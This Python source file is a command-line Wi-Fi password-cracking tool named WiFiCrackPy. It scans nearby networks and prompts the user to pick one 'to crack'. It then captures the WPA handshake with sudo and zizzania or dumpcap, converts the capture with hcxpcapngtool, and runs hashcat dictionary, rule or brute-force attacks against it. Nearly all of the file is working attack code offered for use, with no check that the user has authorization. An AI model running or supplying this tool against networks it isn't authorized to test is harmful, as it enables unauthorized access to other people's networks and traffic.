import sys
import subprocess
import platform
import re
import argparse  # Add this import
from prettytable import PrettyTable
from tabulate import tabulate
from os.path import expanduser
from pyfiglet import Figlet
import os
import glob
from core.utils import find_seclists_wordlist, prompt_download_seclists

# Platform specific configurations
PLATFORM = platform.system().lower()

class PlatformConfig:
    def __init__(self):
        if PLATFORM == "darwin":  # macOS
            self.airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
            self.scan_cmd = ['sudo', self.airport, '-s']
            self.channel_cmd = lambda ch: ['sudo', self.airport, '-c' + ch]
            self.reset_cmd = ['sudo', self.airport, '-z']
            self.get_interface_cmd = ['networksetup', '-listallhardwareports']
            self.interface_parser = lambda output: output.split('\n')[output.split('\n').index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
        
        elif PLATFORM == "linux":  # Linux/Debian
            self.airport = 'iwlist'
            self.scan_cmd = ['sudo', 'iwlist', 'scanning']
            self.channel_cmd = lambda ch: ['sudo', 'iwconfig', 'wlan0', 'channel', ch]
            self.reset_cmd = ['sudo', 'service', 'networking', 'restart']
            self.get_interface_cmd = ['iwconfig']
            self.interface_parser = lambda output: [line.split()[0] for line in output.split('\n') if 'IEEE 802.11' in line][0]
        
        elif PLATFORM == "windows":  # Windows
            self.airport = 'netsh'
            self.scan_cmd = ['netsh', 'wlan', 'show', 'networks', 'mode=Bssid']
            self.channel_cmd = lambda ch: ['netsh', 'wlan', 'connect', 'name=*']  # Windows can't set channel directly
            self.reset_cmd = ['netsh', 'wlan', 'disconnect']
            self.get_interface_cmd = ['netsh', 'wlan', 'show', 'interfaces']
            self.interface_parser = lambda output: re.search(r"Name\s+:\s+(.+)\n", output).group(1)

config = PlatformConfig()

parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
parser.add_argument('-r')
parser.add_argument('--check-deps', action='store_true', help='Check required external tools and exit')
parser.add_argument('--resume', nargs='?', const=True, help='Resume cracking with existing capture files. If no SSID provided, lists available captures')
args = parser.parse_args()

def check_dependencies():
    """Check for required external tools based on platform"""
    required_tools = {
        'darwin': ['hashcat', 'airport', 'hcxpcapngtool', 'zizzania'],
        'linux': ['hashcat', 'iwlist', 'iwconfig', 'hcxpcapngtool'],
        'windows': ['hashcat', 'netsh', 'hcxpcapngtool']
    }
    
    tools = required_tools.get(PLATFORM, [])
    missing = []
    
    for tool in tools:
        if PLATFORM == "darwin" and tool == "airport":
            # Special case for airport on macOS
            if not os.path.exists('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'):
                missing.append(tool)
            continue
        
        if PLATFORM == "darwin" and tool == "zizzania":
            # Special case for zizzania on macOS
            if not os.path.exists(expanduser('~/zizzania/src/zizzania')):
                missing.append(tool)
            continue
            
        try:
            if PLATFORM == "windows":
                # Windows-specific check
                subprocess.run(['where', tool], check=True, capture_output=True)
            else:
                # Unix-like systems
                subprocess.run(['which', tool], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            missing.append(tool)
    
    if missing:
        print(f"Missing required tools: {', '.join(missing)}")
        print("\nInstallation instructions:")
        if PLATFORM == "darwin":
            print("Run: brew install hashcat libpcap wget hcxtools")
            print("For zizzania: git clone https://github.com/cyrus-and/zizzania && cd zizzania && make")
        elif PLATFORM == "linux":
            print("Run: sudo apt-get install wireless-tools hashcat hcxtools libpcap-dev")
        else:
            print("Please check the README for Windows installation instructions")
        sys.exit(1)
    else:
        print("All required tools are installed")
        sys.exit(0)

if args.check_deps:
    check_dependencies()

def scan_networks():
    print('Scanning for networks...\n')
    
    try:
        if PLATFORM == "windows":
            scan = subprocess.run(config.scan_cmd, capture_output=True, text=True)
            networks = parse_windows_networks(scan.stdout)
        elif PLATFORM == "linux":
            scan = subprocess.run(config.scan_cmd, capture_output=True, text=True)
            networks = parse_linux_networks(scan.stdout)
            print(networks)
        else:  # macOS - keep original parsing
            scan = subprocess.run(config.scan_cmd, stdout=subprocess.PIPE)
            scan = scan.stdout.decode('utf-8').split('\n')
            networks = parse_macos_networks(scan)
            
        display_networks(networks)
        return handle_network_selection(networks)
            
    except subprocess.CalledProcessError as e:
        print(f"Error scanning networks: {e}")
        return None

def parse_windows_networks(output):
    networks = {}
    current_network = {}
    index = 1
    
    for line in output.split('\n'):
        if "SSID" in line and "BSSID" not in line:
            if current_network:
                networks[index] = current_network.copy()
                index += 1
                current_network = {}
            current_network['ssid'] = line.split(': ')[1].strip()
        elif "BSSID" in line:
            current_network['bssid'] = line.split(': ')[1].strip()
        elif "Signal" in line:
            current_network['rssi'] = line.split(': ')[1].strip()
        elif "Channel" in line:
            current_network['channel'] = line.split(': ')[1].strip()
        elif "Authentication" in line:
            current_network['security'] = line.split(': ')[1].strip()
    
    if current_network:
        networks[index] = current_network
    
    return networks

def parse_linux_networks(output):
    networks = {}
    index = 1
    
    cells = output.split('Cell ')
    for cell in cells[1:]:  # Skip first empty element
        lines = cell.split('\n')
        network = {}
        
        for line in lines:
            if "ESSID" in line:
                network['ssid'] = line.split(':')[1].strip().strip('"')
            elif "Address" in line:
                network['bssid'] = line.split('Address:')[1].strip()
            elif "Channel" in line:
                network['channel'] = line.split(':')[1].strip()
            elif "Quality" in line:
                network['rssi'] = line.split('=')[1].split()[0]
            elif "Encryption" in line:
                network['security'] = line.split(':')[1].strip()
        
        if network:
            networks[index] = network
            index += 1
    
    return networks

def parse_macos_networks(scan_output):
    networks = {}
    count = len(scan_output) - 1
    scan_output = [o.split() for o in scan_output]

    list = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    for i in range(1, count):
        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan_output[i])).group(0)
        bindex = scan_output[i].index(bssid)

        network = {}
        network['ssid'] = ' '.join(scan_output[i][0:bindex])
        network['bssid'] = bssid
        network['rssi'] = scan_output[i][bindex + 1]
        network['channel'] = scan_output[i][bindex + 2].split(',')[0]
        network['security'] = scan_output[i][bindex + 5].split('(')[0]

        networks[i] = network
        list.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])

    print(list)

    x = input('\nSelect a network to crack - (or press r to refresh): ')
    if x == 'r':
        scan_networks()
    else:
        x = int(x)
    return networks[x]

def display_networks(networks):
    if PLATFORM == "windows":
        # Windows-specific display logic if needed
        pass
    elif PLATFORM == "linux":
        # Linux-specific display logic if needed
        pass
    else:
        # Default (macOS) display logic
        pass

def handle_network_selection(selected_network):
    bssid = selected_network['bssid']
    ssid = selected_network['ssid']
    channel = selected_network['channel']
    capture_network(bssid, ssid, channel)

def capture_network(bssid, ssid, channel):
    subprocess.run(config.reset_cmd)
    subprocess.run(config.channel_cmd(channel))

    if args.i is None:
        iface_output = subprocess.run(config.get_interface_cmd, capture_output=True, text=True)
        iface = config.interface_parser(iface_output.stdout)
    else:
        iface = args.i

    print('\nInitiating capture to get handshake...\n')
    
    # Use platform-specific capture tools
    if PLATFORM == "windows":
        capture_tool = "dumpcap"  # Windows alternative
    else:
        capture_tool = expanduser('~') + '/zizzania/src/zizzania'
    
    capture_cmd = ['sudo', capture_tool, '-i', iface, '-w', f'{ssid}.pcap']
    if PLATFORM != "windows":
        capture_cmd.extend(['-b', bssid, '-q'] + ['-n'] * args.d)
    
    subprocess.run(capture_cmd)
    
    # Convert capture to hashcat format
    subprocess.run(['hcxpcapngtool', '-o', f'{ssid}.hc22000', f'{ssid}.pcap'], stdout=subprocess.PIPE)
    
    print('\nHandshake ready for cracking...\n')
    crack_capture(ssid)


def crack_capture(ssid):
    if args.m is None:
        print(tabulate([[1, 'Dictionary'], [2, 'Brute-force'], [3, 'Manual']], headers=['Number', 'Mode']))
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    if method == 1:
        if args.w is not None:
            wordlist = args.w
        else:
            wordlist = find_seclists_wordlist()
            if wordlist:
                print(f"Using detected wordlist: {wordlist}")
            else:
                wordlist = prompt_download_seclists()
                if not wordlist:
                    wordlist = input('\nInput a wordlist path: ')

    if method == 1 and (args.r is None):
        subprocess.run(['sudo','hashcat', '-m', '22000', str(ssid)+'.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 1 and (args.r is not None):
        rule = args.r
        subprocess.run(['sudo','hashcat', '-m', '22000', str(ssid)+'.hc22000','-r', str(rule), wordlist] + ['-O'] * args.o)
    elif method == 2:
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run(['sudo','hashcat', '-m', '22000', '-a', '3', str(ssid)+'.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: '+str(ssid)+'.hc22000')


def check_existing_captures(ssid):
    required_files = [f"{ssid}.hc22000", f"{ssid}.pcap"]
    missing = [f for f in required_files if not os.path.exists(f)]
    
    if missing:
        print(f"Missing required files for {ssid}: {', '.join(missing)}")
        return False
    return True

def list_available_captures():
    """List all SSIDs that have both .hc22000 and .pcap files"""
    hc_files = set(f.replace('.hc22000', '') for f in glob.glob('*.hc22000'))
    pcap_files = set(f.replace('.pcap', '') for f in glob.glob('*.pcap'))
    
    available_ssids = hc_files.intersection(pcap_files)
    
    if not available_ssids:
        print("No existing captures found")
        return None
    
    print("\nAvailable captures:")
    for idx, ssid in enumerate(available_ssids, 1):
        print(f"{idx}. {ssid}")
    
    choice = input("\nEnter number to resume cracking (or press Enter to exit): ")
    if choice.isdigit() and 1 <= int(choice) <= len(available_ssids):
        return list(available_ssids)[int(choice) - 1]
    return None

# Modify main execution
if __name__ == "__main__":
    f = Figlet(font='big')
    print('\n' + f.renderText('WiFiCrackPy'))

    if args.resume:
        if isinstance(args.resume, bool):
            # No SSID provided, list available ones
            ssid = list_available_captures()
            if ssid:
                crack_capture(ssid)
        else:
            # SSID provided as argument
            if check_existing_captures(args.resume):
                print(f"\nResuming with existing capture for {args.resume}")
                crack_capture(args.resume)
    else:
        scan_networks()
